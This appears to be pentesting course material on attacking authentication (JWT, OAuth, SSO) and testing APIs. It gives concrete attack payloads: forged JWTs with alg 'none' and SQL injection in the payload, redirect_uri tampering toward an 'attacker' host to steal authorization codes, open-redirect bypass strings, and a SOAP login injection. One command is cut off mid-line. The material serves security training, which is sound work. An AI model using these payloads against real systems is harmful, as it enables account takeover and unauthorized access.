<h1 id="-attacking-authentication-sso-"><strong>Attacking Authentication &amp; SSO</strong></h1>
<h3 id="-authentication-in-web-apps-"><strong>Authentication in Web Apps</strong></h3>
<p>Authentication is the process of confirming a user&#39;s identity. Authentication in web applications is performed through user credentials and/or a secret token/pin code.</p>
<p>The most known attacks against authentication are:</p>
<ul>
<li>Brute Force / Dictionary Attack</li>
<li>SQL Injection</li>
<li>Weak/Predictable Session ID</li>
<li>Subdomain takeover</li>
</ul>
<p>Modern web applications utilize authentication/authorization mechanisms which provide Single-Sign-On (SSO) and similar features for sharing access with multiple applications.</p>
<ul>
<li><strong>JSON Web Tokens (JWT)</strong>: A compact mechanism used for transferring claims between two parties.</li>
<li><strong>OAuth</strong>: Access delegation framework, usually used for providing application access to other applications without password sharing. OAuth 2.0 is not an authentication protocol.</li>
<li><strong>Security Assertion Markup Language (SAML)</strong>: An XML based single sign-on login standard.</li>
</ul>
<p>Modern web applications also utilize an extra layer of defense when it comes to authentication, 2 Factor Authentication (2FA).</p>
<p>2FA is a method to verify a user’s identity by utilizing a combination of two different factors.</p>
<ul>
<li>Something you know (password)</li>
<li>Something you have (OTP)</li>
<li>Something you are (biometric)</li>
</ul>
<p>Usual 2FA Bypasses:</p>
<ul>
<li>Brute Force (when a secret of limited length is utilized)</li>
<li>Less common interfaces (mobile app, XMLRPC, API instead of web)</li>
<li>Forced Browsing</li>
<li>Predictable/Reusable Tokens<h2 id="-attacking-jwt-"><strong>Attacking JWT</strong></h2>
<h3 id="-json-web-tokens-jwt-"><strong>JSON Web Tokens (JWT)</strong></h3>
</li>
</ul>
<p>JSON Web Token (JWT) usually appear to users as JSON objects and can be signed to protect the integrity of the underlying message using a Message Authentication Code (MAC) and/or encrypted.</p>
<p>When a JWT is signed you may see it referred to as JWS. A JWT consists of three parts; an encoded Header, an encoded Payload and the Signature.</p>
<p>![[jwt.png]]</p>
<ul>
<li>The header contains info about the token.</li>
<li>The payload contains the actual data.</li>
<li>For the signature to be created we need to encode both the header and the payload using Base64 URL encoding, then we combine them with a dot (.).</li>
</ul>
<p>To sign an unsigned token, the process is as follows.</p>
<pre><code><span class="hljs-attr">unsignedToken</span> = encodeBase64(header) + <span class="hljs-string">'.'</span> + encodeBase64(payload)
</code></pre><pre><code>signature_encoded = encodeBase64(<span class="hljs-name">HMAC</span> SHA256(<span class="hljs-string">"secret"</span>, unsignedToken))
</code></pre><pre><code>jwt_token = encodeBase64(<span class="hljs-name">header</span>) + <span class="hljs-string">"."</span> + encodeBase64(<span class="hljs-name">payload</span>) + <span class="hljs-string">"."</span> + signature_encoded
</code></pre><h3 id="-jwt-security-facts-"><strong>JWT Security Facts</strong></h3>
<ul>
<li>JWT is not vulnerable to CSRF (except when JWT is put in a cookie)</li>
<li>Session theft through an XSS attack is possible when JWT is used</li>
<li>Improper token storage (HTML5 storage/cookie)</li>
<li>Sometimes the key is weak and can be brute-forced</li>
<li>Faulty token expiration</li>
<li>JWT can be used as Bearer token in a custom authorization header</li>
<li>JWT is being used for stateless applications. JWT usage results in no server-side storage and database-based session management. All info is put inside a signed JWT token.<ul>
<li>Only relying on the secret key</li>
<li>Logging out or invalidating specific users is not possible due to the above stateless approach. The same signing key is used for everyone.</li>
</ul>
</li>
<li>JWT-based authentication can become insecure when client side data inside the JWT are blindly trusted<ul>
<li><strong>Many apps blindly accept the data contained in the payload (no signature verification)</strong><ul>
<li>Try submitting various injection-related strings</li>
<li>Try changing a user’s role to admin etc.</li>
</ul>
</li>
<li><strong>Many apps have no problem accepting an empty signature (effectively no signature)</strong><ul>
<li>The above is also known as “The admin party in JWT”</li>
<li>This is by design, to support cases when tokens have already been verified through another way</li>
<li>When assessing JWT endpoints set the alg to none and specify anything in the payload</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>There is a variety of tools for assessing/attacking JWT. For example <a href="https://github.com/KINGSABRI/jwtear">jwtear</a>.</p>
<p>HMAC SHA256 signed token creation example:</p>
<pre><code class="lang-bash">jwtear –-<span class="hljs-keyword">generate</span>-token –-header '{<span class="hljs-string">"typ"</span>:<span class="hljs-string">"JWT"</span>,<span class="hljs-string">"alg"</span>:<span class="hljs-string">"HS256"</span>}' --payload '{<span class="hljs-string">"login"</span>:<span class="hljs-string">"admin"</span>}' --key 'cr@zyp@ss'
</code></pre>
<p>Empty signature token creating example:</p>
<pre><code class="lang-bash">jwtear –-<span class="hljs-keyword">generate</span>-token –-header '{<span class="hljs-string">"typ"</span>:<span class="hljs-string">"JWT"</span>,<span class="hljs-string">"alg"</span>:<span class="hljs-string">"none"</span>}' --payload '{<span class="hljs-string">"login"</span>:<span class="hljs-string">"admi</span>
</code></pre>
<p>Testing for injection example:</p>
<pre><code class="lang-bash">jwtear –-<span class="hljs-keyword">generate</span>-token –-header '{<span class="hljs-string">"typ"</span>:<span class="hljs-string">"JWT"</span>,<span class="hljs-string">"alg"</span>:<span class="hljs-string">"none"</span>}' --payload $'{<span class="hljs-string">"login"</span>:<span class="hljs-string">"admin\' or \'a\'=\'a"</span>}'
</code></pre>
<blockquote>
<p>[!Note]
<code>$</code> is used to escape single quotes.</p>
<h2 id="-attacking-oauth-"><strong>Attacking OAuth</strong></h2>
<h3 id="-oauth-"><strong>OAuth</strong></h3>
</blockquote>
<p>OAuth2 is the main web standard for authorization between services. It is used to authorize 3rd party apps to access services or data from a provider with which you have an account.</p>
<p><strong>OAuth Components</strong></p>
<ul>
<li><strong>Resource Owner</strong>: the entity that can grant access to a protected resource. Typically this is the end-user.</li>
<li><strong>Client</strong>: an application requesting access to a protected resource on behalf of the Resource Owner. This is also called a Relying Party.</li>
<li><strong>Resource Server</strong>: the server hosting the protected resources. This is the API you want to access, in our case gallery.</li>
<li><strong>Authorization Server</strong>: the server that authenticates the Resource Owner, and issues access tokens after getting proper authorization. This is also called an identity provider (IdP).</li>
<li><strong>User Agent</strong>: the agent used by the Resource Owner to interact with the Client, for example a browser or a mobile application.</li>
</ul>
<p><strong>OAuth Scopes</strong> (actions or privilege requested from the service – visible through the scope parameter)</p>
<ul>
<li>Read</li>
<li>Write</li>
<li>Access Contacts</li>
</ul>
<p>In OAuth 2.0, the interactions between the user and her browser, the Authorization Server, and the Resource Server can be performed in four different flows.</p>
<ol>
<li>The <strong>authorization code grant</strong>: the Client redirects the user (Resource Owner) to an Authorization Server to ask the user whether the Client can access her Resources. After the user confirms, the Client obtains an Authorization Code that the Client can exchange for an Access Token. This Access Token enables the Client to access the Resources of the Resource Owner.</li>
<li>The <strong>implicit grant</strong> is a simplification of the authorization code grant. The Client obtains the Access Token directly rather than being issued an Authorization Code.</li>
<li>The <strong>resource owner password credentials grant</strong> enables the Client to obtain an Access Token by using the username and password of the Resource Owner.</li>
<li>The <strong>client credentials grant</strong> enables the Client to obtain an Access Token by using its own credentials.</li>
</ol>
<blockquote>
<p>Clients use these access tokens to access an API.</p>
<p>The access token is almost always a bearer token. Some applications use JWT as access tokens.</p>
<h3 id="-common-oauth-attacks-"><strong>Common OAuth Attacks</strong></h3>
<h4 id="-unvalidated-redirecturi-parameter-"><strong>Unvalidated RedirectURI Parameter</strong></h4>
</blockquote>
<p>If the authorization server does not validate that the redirect URI belongs to the client, it is susceptible to two types of attacks.</p>
<ul>
<li>Open Redirect</li>
<li>Account hijacking by stealing authorization codes. If an attacker redirects to a site under their control, the authorization code - which is part of the URI - is given to them. They may be able to exchange it for an access token and thus get access to the user&#39;s resources.</li>
</ul>
<p>Capture the URL the OAuth client uses to communicate with the authorization endpoint.</p>
<pre><code><span class="hljs-attribute">http</span>://gallery:3005/oauth/authorize?response_type=code&amp;redirect_uri=http<span class="hljs-number">%3</span>A<span class="hljs-number">%2</span>F<span class="hljs-number">%2</span> Fphotoprint<span class="hljs-number">%3</span>A3000<span class="hljs-number">%2</span>Fcallback&amp;scope=view_gallery&amp;client_id=photoprint
</code></pre><p>Change the value of the <code>redirect_uri</code> parameter.</p>
<pre><code><span class="hljs-attribute">http</span>://gallery:3005/oauth/authorize?response_type=code&amp;redirect_uri=http<span class="hljs-number">%3</span>A<span class="hljs-number">%2</span>F<span class="hljs-number">%2</span> Fattacker<span class="hljs-number">%3</span>A1337<span class="hljs-number">%2</span>Fcallback&amp;scope=view_gallery&amp;client_id=photoprint
</code></pre><p>If the redirect URI accepts external URLs, such as accounts.google.com, then use a redirector in that external URL to redirect to any website<code>https://accounts.google.com/signout/chrome/landing?continue=https:// appengine.google.com/_ah/logout?continue%3Dhttp://attacker:1337</code></p>
<p>Use any of the regular bypasses.</p>
<pre><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com%2f%2f.victim.com</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com%5c%5c.victim.com</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com%3F.victim.com</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com%23.victim.com</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//victim.com:80%40example.com</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//victim.com%2eexample.com</span>
</code></pre><h4 id="-weak-authorization-codes-"><strong>Weak Authorization Codes</strong></h4>
<p>If the authorization codes are weak, an attacker may be able to guess them at the token endpoint. This is especially true if the client secret is compromised, not used, or not validated.</p>
<p>Intercept the request that the OAuth 2.0 client sends to the OAuth 2.0 Authorization Endpoint. Send the request to Burp’s Sequencer. Select “live capture’ and then click “Analyze now”. The results will inform you whether you are dealing with weak auth codes or not.</p>
<h4 id="-everlasting-authorization-codes-"><strong>Everlasting Authorization Codes</strong></h4>
<p>Expiring unused authorization codes limits the window in which an attacker can use captured or guessed authorization codes, but that’s not always the case.</p>
<p>Intercept the request that the OAuth 2.0 client sends to the OAuth 2.0 Authorization Endpoint. Send the request to Burp’s “Session Timeout Test” plugin. Configure the plugin by selecting a matching string that indicates the authorization code is invalid (typically &#39;Unauthorized&#39;) and a minimum timeout of 31 minutes.</p>
<h4 id="-authorization-codes-not-bound-to-client-"><strong>Authorization Codes Not Bound to Client</strong></h4>
<p>An attacker can exchange captured or guessed authorization codes for access tokens by using the credentials for another, potentially malicious, client.</p>
<p>Obtain an authorization code (guessed or captured) for an OAuth 2.0 client and exchange with another client.</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/oauth/token</span> HTTP/1.1
<span class="hljs-attribute">host</span>: gallery:3005
<span class="hljs-attribute">Content-Length</span>: 133
<span class="hljs-attribute">Connection</span>: close

<span class="lsl">code=<span class="hljs-number">9</span>&amp;redirect_uri=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fphotoprint%<span class="hljs-number">3</span>A3000%<span class="hljs-number">2</span>Fcallback&amp;grant_typ e=authorization_code&amp;client_id=maliciousclient&amp;client_secret=secret</span>
</code></pre><h4 id="-weak-handle-based-access-and-refresh-tokens-"><strong>Weak Handle-Based Access and Refresh Tokens</strong></h4>
<p>If the tokens are weak, an attacker may be able to guess them at the resource server or the token endpoint.</p>
<p>Analyze the entropy of multiple captured tokens. Note that it is hard to capture tokens for clients that are classic web applications as these tokens are communicated via a back-channel1. Identity the location of the token endpoint. Most OAuth servers with openID/Connect support publish the locations of their endpoints at <code>https://[base-server-url]/.well-known/openid-configuration</code> or at <code>https://[base-server-url]/.well-known/oauth-authorization-server</code>. If such endpoint is not available, the token endpoint is usually hosted at token.</p>
<ol>
<li>Make requests to the token endpoint with valid authorization codes or refresh tokens and capture the resulting access tokens. Note that the client ID and secret are typically required. They may be in the body or as a Basic Authorization header.</li>
</ol>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/token</span> HTTP/1.1
<span class="hljs-attribute">host</span>: gallery:3005
<span class="hljs-attribute">Content-Length</span>: 133
<span class="hljs-attribute">Connection</span>: close

<span class="lsl">code=<span class="hljs-number">9</span>&amp;redirect_uri=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fphotoprint%<span class="hljs-number">3</span>A3000%<span class="hljs-number">2</span>Fcallback&amp; grant_type=authorization_code&amp;client_id=maliciousclient&amp;client_secret=s ecret</span>
</code></pre><ol>
<li>Analyze the entropy of these tokens using the same approach as described in weak authorization codes. Alternatively, brute-force the tokens at the resource server if you have a compromised client secret or if the client secret is not necessary. The attacker above followed this approach.<h4 id="-insecure-storage-of-handle-based-access-and-refresh-tokens-"><strong>Insecure Storage of Handle-Based Access and Refresh Tokens</strong></h4>
</li>
</ol>
<p>If the handle-based tokens are stored as plain text, an attacker may be able to obtain them from the database at the resource server or the token endpoint.</p>
<p>To validate this as a tester, obtain the contents of the database via a NoSQL/SQL injection attack, and validate whether the tokens have been stored unhashed. Note that it is better to validate this using a code review.</p>
<h4 id="-refresh-token-not-bound-to-client-"><strong>Refresh Token not Bound to Client</strong></h4>
<p>If the binding between a refresh token and the client is not validated, a malicious client may be able to exchange captured or guessed refresh tokens for access tokens. This is especially problematic if the application allows automatic registration of clients.</p>
<p>Exchange a refresh token that was previously issued for one client with another client. Note, this requires access to multiple clients and their client secrets.</p>
<h2 id="-labs-"><strong>Labs</strong></h2>
<h4 id="-jwt-"><strong>JWT</strong></h4>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#jwt">https://portswigger.net/web-security/all-labs#jwt</a></li>
<li><a href="https://github.com/HiitCat/JWT-SecLabs">https://github.com/HiitCat/JWT-SecLabs</a></li>
<li><a href="https://github.com/h-a-c/jwt-lab">https://github.com/h-a-c/jwt-lab</a><h4 id="-oauth-"><strong>OAuth</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#oauth-authentication">https://portswigger.net/web-security/all-labs#oauth-authentication</a></li>
<li><a href="https://portswigger.net/web-security/all-labs#authentication">https://portswigger.net/web-security/all-labs#authentication</a></li>
<li><a href="https://github.com/cyllective/oauth-labs/">https://github.com/cyllective/oauth-labs/</a></li>
<li><a href="https://github.com/koenbuyens/Vulnerable-OAuth-2.0-Applications">https://github.com/koenbuyens/Vulnerable-OAuth-2.0-Applications</a></li>
</ul>
<hr>
<h1 id="-pentesting-apis-"><strong>Pentesting APIs</strong></h1>
<h2 id="-introduction-to-apis-"><strong>Introduction to APIs</strong></h2>
<p>API stands for Application Programming Interface. It is a non-GUI collection of endpoints in a standardized form so it can be used by human user as well as a machine. It is often accompanied by documentation that can be in both a machine and a human readable form.</p>
<p>There are lots of APIs, for example Windows API, remote APIs like RPC (Remote Procedure Call), but we will focus on web APIs, mainly:</p>
<ul>
<li>Web services (SOAP/XML)</li>
<li>REST APIs (JSON)</li>
</ul>
<p>From a technical standpoint, API differs from a website because:</p>
<ul>
<li>It has a standardized input/output form so that it can be scripted.</li>
<li>It is language independent (it should work on each platform in the same way).</li>
<li>It aims to be secure (e.g., it allows only some predefined methods).</li>
</ul>
<p>SOAP API utilizes the Simple Object Access Protocol to define communication standard – so how the request and response looks, as well as the parameters can be passed in them.</p>
<p>SOAP Messages (HTTP Requests) are an XML type and must contain some special elements.</p>
<ul>
<li>Content type <code>text/xml</code> is also allowed.</li>
<li>SOAPAction is sometimes used just for the standard and sometimes needs to hold the called method name.</li>
</ul>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/Uripath</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: www.example.com
<span class="hljs-attribute">Content-Type</span>: application/soap+xml; charset=utf-8
<span class="hljs-attribute">Content-Length</span>: 299
<span class="hljs-attribute">SOAPAction</span>: "http://www.w3.org/2003/05/soap-envelope"

<span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://www.w3.org/2003/05/soap-envelope"</span> <span class="hljs-attr">xmlns:m</span>=<span class="hljs-string">"http://www.example.com"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soap:Header</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Header</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">m:MethodName</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">m:Parameter</span>&gt;</span>PARAMETER VALUE<span class="hljs-tag">&lt;/<span class="hljs-name">m:Parameter</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">m:MethodName</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span></span>
</code></pre><p>Here is the sample response which follows the SOAP standard and is in XML format.</p>
<pre><code>HTTP/1.1 <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Content-Type</span>: text/xml; charset=utf-8
<span class="hljs-attribute">Content-Length</span>: length

<span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">MatchResult</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ResultValue</span>&gt;</span>TheValue<span class="hljs-tag">&lt;/<span class="hljs-name">ResultValue</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">MatchResult</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span></span>
</code></pre><p>As said previously, API contains both human and machine readable documentation. For SOAP-based APIs, the documentation is stored in WSDL files. Usually, these files are stored under the <code>?wsdl</code> path, for example, <code>https://api.example.com/api/?wsdl</code>.</p>
<p>You can take a look at an exemplary calculator service online at address: <a href="http://www.dneonline.com/calculator.asmx">http://www.dneonline.com/calculator.asmx</a></p>
<p>At the following address, <a href="http://www.dneonline.com/calculator.asmx?op=Add">http://www.dneonline.com/calculator.asmx?op=Add</a>, you can see an exemplary SOAP request that was issued in order to speak to the calculator service. You can also see the full WSDL file at: <a href="http://www.dneonline.com/calculator.asmx?wsdl">http://www.dneonline.com/calculator.asmx?wsdl</a></p>
<p>As you can see, reconstructing each method separately to create a valid request would be a time-consuming task. To Turn the WSDL document into a working request, we can use some automated tools.</p>
<p>This kind of interface, equipped with documentation that can be parsed by a machine, allows us to expose a large number of methods where each of them has its own purpose.</p>
<p>Another type of API is REST (Representational State Transfer) APIs. Usually, the method client is about to call is in the resource path: <code>GET /api/v2/methodName</code></p>
<p>Depending on the request type, the parameters might be passed differently.</p>
<p>In REST APIs, HTTP methods have some special meaning:</p>
<ul>
<li>GET – Read resource</li>
<li>POST – Create resource</li>
<li>PUT – Update resource</li>
<li>DELETE – Delete resource</li>
<li>PATCH – Update resource partially</li>
</ul>
<p>Except for GET requests, API methods parameters are passed in the request body.</p>
<p>Remember, that the meaning of these methods is a common practice and not a requirement, so technically it is possible that a method you encounter does something different (e.g., POST is used for logging in).</p>
<p>An exemplary REST API request can be seen to the right:</p>
<ul>
<li>Path often contains the API version</li>
<li>Content-Type <code>application/json</code> header is required</li>
<li>Parameters are passed as JSON array</li>
</ul>
<pre><code>POST <span class="hljs-regexp">/api/</span><span class="hljs-number">2.2</span><span class="hljs-regexp">/auth/</span>signin HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-string">HOST:</span> my-server
Content-<span class="hljs-string">Type:</span>application/json
<span class="hljs-string">Accept:</span>application/json

{
    <span class="hljs-string">"credentials"</span>: { 
        <span class="hljs-string">"name"</span>: <span class="hljs-string">"administrator"</span>,
        <span class="hljs-string">"password"</span>: <span class="hljs-string">"passw0rd"</span>,
        <span class="hljs-string">"site"</span>: { 
            <span class="hljs-string">"contentUrl"</span>: <span class="hljs-string">""</span>
        }
    }
}
</code></pre><p>It is also often possible to pass the REST API parameters as XML, so the equivalent of the request from the previous slide would look like the listing to the right.</p>
<pre><code>POST /api/2.2/auth/signin HTTP/1.1
HOST: my-server
Content-Type:text/xml

<span class="hljs-tag">&lt;<span class="hljs-name">tsRequest</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">credentials</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"administrator"</span> <span class="hljs-attr">password</span>=<span class="hljs-string">"passw0rd"</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">site</span> <span class="hljs-attr">contentUrl</span>=<span class="hljs-string">""</span> /&gt;</span>
 <span class="hljs-tag">&lt;/<span class="hljs-name">credentials</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tsRequest</span>&gt;</span>
</code></pre><p>REST API also has a documentation standard called the WADL file. A sample WADL can be viewed here: <a href="https://www.w3.org/Submission/wadl/">https://www.w3.org/Submission/wadl/</a>. Similar to WSDL, we will shortly present tools that help to parse the lengthy file in order not to rewrite all the methods manually.</p>
<p>In order to make developer’s (and penetration testers’) lives easier, some APIs include a more human-friendly API representation. For example, a very popular API engine named Swagger is often found with its demo page, which contains forms with description and possibility to issue a request to each method.</p>
<p>You can see sample Swagger API here: <a href="https://swagger.io/tools/swagger-ui/">https://swagger.io/tools/swagger-ui/</a>. Click on &quot;Live Demo&quot; to try it yourself.</p>
<p>You can find more resources on APIs by clicking on the below links:</p>
<ul>
<li><a href="https://swagger.io/">https://swagger.io/</a></li>
<li><a href="https://www.w3.org/TR/wsdl.html">https://www.w3.org/TR/wsdl.html</a></li>
<li><a href="https://www.w3.org/Submission/wadl/">https://www.w3.org/Submission/wadl/</a></li>
<li><a href="https://www.w3.org/TR/soap/">https://www.w3.org/TR/soap/</a><h3 id="-graphql-apis-"><strong>GraphQL APIs</strong></h3>
</li>
</ul>
<p>Graphql is a different type of API interface where there is one endpoint to an API (Instead of many endpoints in REST), and two types of operations (Query and Mutate) instead of 5 or so in REST (GET, PUT, POST, PATCH, DELETE).</p>
<p>Usually <code>example.com/graphql</code> or something similar (Nice idea of Google dorks). REST usually has one endpoint for each type of object (users, groups, items, books, orders, shipments...etc) with 3 or more operations on each endpoint. In graphql, the same endpoint serves all predefined objects under both Query and Mutation methods.</p>
<p><strong>GRAPHQL TERMS</strong></p>
<ul>
<li>Query: A query operation on an object or type.</li>
<li>Mutate: an update operation on an object, like creating a new one, updating it fully, updating it partially, or deleting it.</li>
<li>Type (objecttype): A type of object, like a class or table, e.g. Users, Orders, books</li>
<li>Schema: Describes the types, fields and actions available.</li>
<li>Introspection: A method to learn more about the schema details like types and fields.</li>
<li>Resolver: A function that connects schema definitions to actual backend data sources like SQL tables.</li>
<li>Scalar Type: Type of data for a field, like string, int or custom types.</li>
</ul>
<p>Sample GraphQL query:</p>
<pre><code class="lang-graphql">{
    users {
        id
        username
        isSuperuser
        email
    }
}
</code></pre>
<p>GraphQLcan also be called from the command line using curl.</p>
<ul>
<li>Using POST</li>
<li>Content-type is JSON</li>
<li>Output is sent to <code>jq</code> for pretty JSON</li>
</ul>
<p>Calling a particular object in GraphQL:</p>
<pre><code class="lang-bash">curl -X <span class="hljs-keyword">POST</span> -<span class="hljs-keyword">H</span> <span class="hljs-string">"Content-Type: application/json"</span> --data '{<span class="hljs-string">"query"</span>:<span class="hljs-string">"{ user(id:\"</span>2\<span class="hljs-string">") {id username} }"</span>}' http:<span class="hljs-comment">//localhost/graphql | jq</span>
</code></pre>
<p><strong>Graphql nesting queries</strong>:</p>
<ul>
<li>Display each user with his group subscriptions using graphql, showing the id and name of the group</li>
</ul>
<p><strong>Security in graphql</strong></p>
<ul>
<li>Graphql has no built-in understanding of security. It will return the object as it was requested.</li>
<li>Without explicit filtering, sensitive data could be exposed and extracted.</li>
<li>Can we read user sensitive info such as passwords?</li>
</ul>
<p><strong>Making updates in graphql</strong>:</p>
<ul>
<li>In Graphql, updates (Addition, Creation, Deletion) are called mutations.</li>
</ul>
<p>The deleteUser mutation can be called by:</p>
<ul>
<li>Defining the query type to be a mutation</li>
<li>Selecting the named deleteUser mutation</li>
<li>Supplying the id to be deleted, and a sub selection for response (ok field here)</li>
</ul>
<pre><code class="lang-graphql"><span class="hljs-selector-tag">mutation</span> <span class="hljs-selector-tag">deleteUser</span>
{
    <span class="hljs-selector-tag">deleteUser</span>(<span class="hljs-attribute">id</span>:<span class="hljs-number">24</span>)
    {
        <span class="hljs-selector-tag">ok</span>
    }
}
</code></pre>
<h2 id="-api-testing-and-attacking-"><strong>API Testing and Attacking</strong></h2>
<p>APIs are built in a way that one request path (one <strong>endpoint</strong>) allows us to call one method (execute one type of action). The path we are requesting is an abstract mapping to some resources; that means, when requesting the endpoint <code>/api/v3/methodName</code>, it does not reflect file/directory structure on the server.</p>
<p>The request is processed by a special component that maps the path to certain operation handlers and not to physical file/directory resources. However, do not be discouraged from using your favorite content discovery tools on the API enabled server. Some server paths can be mapped to the API routines, but still, some requests can be handled by the server in an original way allowing it to expose files and directories to the user.</p>
<p>It is possible than when you request <code>/api/anything</code> then every character past „anything” is parsed by the API engine, but you can still find interesting files on the server under, for example <code>/version.txt</code>.</p>
<p>Regardless of the fact that APIs make use of predefined methods, you should be aware that there can still be vulnerabilities related to:</p>
<ul>
<li>Parameters to these predefined functions</li>
<li>The API parsing itself</li>
<li>Access to sensitive methods</li>
</ul>
<p>We will cover each of these cases in the following sections. First, as you encounter an API during a penetration test, you should focus on the proper reconnaissance of the API interface, which includes:</p>
<ul>
<li>What is the API name and version? Is it a custom implementation or, for example, an open-source product?</li>
<li>Is there any online documentation available? Are there any interesting methods?</li>
<li>Does the documentation exist on the target server (?wsdl, ?wadl, or similar)?</li>
<li>Does the API require authentication, or is publicly available?</li>
<li>If there is both local and public documentation for an API, do they match? Maybe some methods were hidden from local users (typically ones that allow insecure operations).</li>
</ul>
<p>Your purpose is to gather as many API endpoints as possible and to be able to speak to them. You should also be able to get the WSDL/WADL file for further testing.</p>
<p>Reconstructing API calls from a raw WSDL/WADL file would be time-consuming, so a proper tool might help you to do it faster. For API testing and parsing WSDL/WADL files into a ready-to-use method set, you might want to use <strong>Postman</strong>, the free edition of <strong>SOAPUI</strong>, or the Burp Pro extension called <strong>WSDLer</strong>.</p>
<p>You can download a standalone installer of SoapUI from its <a href="https://www.soapui.org/downloads/latest-release.html">homepage</a>.We will present its usage on Kali Linux. At the time of the release of the course, the latest version is 5.8.0.</p>
<p>As the software is launched, you can first connect it to the proxy, in this case, the burpsuite instance. This way, you will be able to replay and change requests issued to the API. To set up the proxy, you need to go to File → Preferences → Proxy Settings and point it to the burp instance.</p>
<p>You can then switch the proxying on and off by clicking the Proxy button on the upper menu.</p>
<p>Let’s now try to parse the sample WSDL/WADL file. There are sample files shipped with the software itself. In order to load a WSDL (for SOAP) or WADL (for REST), click the respective buttons in the SoapUI on the upper menu</p>
<p>By default, you can find example WSDL/WADL files in <code>/root/SoapUI-Tutorials/WSDL-WADL/</code>.</p>
<p>If you now click on a tree node and then double click on „Request”, a request window will appear. In this case, we are viewing the „login” method. The method can be found in the WSDL file as well. SoapUI automatically fills argument placeholders with „?”. It is you who should decide what to fill in there. In that case, we see that the application expects the argument of type „String”.</p>
<p>If you press the green button, the request will be issued and, in this case, will be proxied through Burp Suite.</p>
<p>Testing REST APIs can be done exactly in the same way; the difference is you import a WADL file instead of WSDL. So, once you encounter a WSDL on the web application, you can copy its source (Open it in a browser, go to Source, and select all → copy &amp; paste to a file) and import it to SoapUI.</p>
<p>Remember that API is another transport mechanism for some information that is sent to the API Consumer (i.e., the application back-end). With this in mind, you can try to tamper with everything that is transported by the API – for example, you are free to check if the username or passwords field is vulnerable to injection attacks in the previous login request.</p>
<p>Here we see what a sample request might look like.</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/sample</span> HTTP/1.1
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Content-Type</span>: text/xml;charset=UTF-8
<span class="hljs-attribute">SOAPAction</span>: "http://www.soapui.org/sample/login"
<span class="hljs-attribute">Content-Length</span>: 297
<span class="hljs-attribute">Host</span>: www.soapui.org
<span class="hljs-attribute">User-Agent</span>: Apache-HttpClient/4.1.1
<span class="hljs-attribute">Connection</span>: close

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/ "</span> <span class="hljs-attr">xmlns:sam</span>=<span class="hljs-string">"http://www.soapui.org/sample/"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sam:login</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>' or '1'='1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
